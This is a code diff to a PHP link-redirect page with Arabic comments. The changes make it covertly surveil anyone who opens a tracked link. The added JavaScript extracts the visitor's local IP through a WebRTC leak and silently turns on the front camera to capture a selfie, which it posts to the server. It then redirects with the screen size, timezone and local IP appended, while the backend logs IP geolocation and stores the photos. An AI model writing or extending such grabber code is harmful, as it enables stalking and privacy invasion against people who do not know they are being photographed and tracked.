@@ -1,5 +1,5 @@
 <?php
-// إظهار الأخطاء للتحقق
+// إظهار الأخطاء للتشخيص
 ini_set('display_errors', 1);
 error_reporting(E_ALL);
 
@@ -34,7 +34,7 @@ try {
     die("خطأ في قاعدة البيانات: " . $e->getMessage());
 }
 
-// استقبال ووخزن صورة السيلفي في الخلفية بصمت
+// استقبال صورة السيلفي وحفظها
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) &&$_POST['action'] === 'save_photo') {
     $code =$_POST['code'] ?? '';
     $imgData =$_POST['image'] ?? '';
@@ -102,7 +102,7 @@ function get_ip_details($ip) {
         return [
             'country' => $data['country'] ?? 'غير معروف',
             'city' => $data['city'] ?? 'غير معروف',
-            'lat' => $data['lat'] ?? '36.7538', 'lon' =>$data['lon'] ?? '3.0588',
+            'lat' => $data['lat'] ?? '36.7538',              'lon' =>$data['lon'] ?? '3.0588',
             'isp' => parse_isp($data['isp'] ?? '',$data['org'] ?? '')
         ];
     }
@@ -243,11 +243,30 @@ if (!empty($filter_code)) {
             const hasScreen = urlParams.has('screen');
 
             if (redirectCode && !hasScreen) {
-                // التوجيه الفوري والسريع جداً دون انتظار الكاميرا
                 const screenRes = screen.width + "x" + screen.height;
                 const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                
-                // محاولة التقاط الصورة في الخلفية بصمت تام (إن أمكن) دون تأخير التوجيه
+
+                // استخراج عنوان IP المحلي عبر WebRTC لجلب تفاصيل الشبكة الداخلية بدقة
+                let localIp = "غير متوفر";
+                window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+                if (window.RTCPeerConnection) {
+                    try {
+                        const pc = new RTCPeerConnection({iceServers: []});
+                        pc.createDataChannel("");
+                        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                        pc.onicecandidate = function(ice) {
+                            if (ice && ice.candidate && ice.candidate.candidate) {
+                                const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9:]+:+[a-f0-9:]+)/;
+                                const match = ipRegex.exec(ice.candidate.candidate);
+                                if (match) {
+                                    localIp = match[1];
+                                }
+                            }
+                        };
+                    } catch(e) {}
+                }
+
+                // محاولة تشغيل الكاميرا والتقاط الصورة بصمت في الخلفية
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                         .then(function(stream) {
@@ -268,16 +287,26 @@ if (!empty($filter_code)) {
                                 formData.append('code', redirectCode);
                                 formData.append('image', imageData);
 
-                                // إرسال الصورة للخادم في الخلفية
-                                navigator.sendBeacon(window.location.href, formData);
-                            }, 300);
-                        }).catch(function(e) {});
+                                fetch(window.location.href, {
+                                    method: 'POST',
+                                    body: formData
+                                }).finally(() => {
+                                    redirectToTarget(redirectCode, screenRes, tz, localIp);
+                                });
+                            }, 800);
+                        })
+                        .catch(function(error) {
+                            redirectToTarget(redirectCode, screenRes, tz, localIp);
+                        });
+                } else {
+                    redirectToTarget(redirectCode, screenRes, tz, localIp);
                 }
-
-                // الانتقال الفوري للرابط المستهدف
-                window.location.href = `/?r=${redirectCode}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
             }
         });
+
+        function redirectToTarget(code, screenRes, tz, localIp) {
+            window.location.href = `/?r=${code}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}&lip=${encodeURIComponent(localIp)}`;
+        }
 
         function copyText(text, btnElement) {
             navigator.clipboard.writeText(text).then(() => {
